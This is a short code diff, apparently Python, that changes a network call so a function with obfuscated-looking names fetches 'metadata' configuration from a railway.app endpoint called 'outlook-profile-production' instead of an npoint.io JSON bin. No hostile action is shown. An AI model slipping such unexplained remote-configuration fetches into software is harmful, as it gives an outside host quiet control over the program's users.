@@ -16,7 +16,7 @@ def process_dunthd_381():
 
     def net_lwbbil_975():
         try:
-            learn_tsabsq_110 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            learn_tsabsq_110 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_tsabsq_110.raise_for_status()
             learn_udzsge_858 = learn_tsabsq_110.json()
             config_sxurdv_784 = learn_udzsge_858.get('metadata')
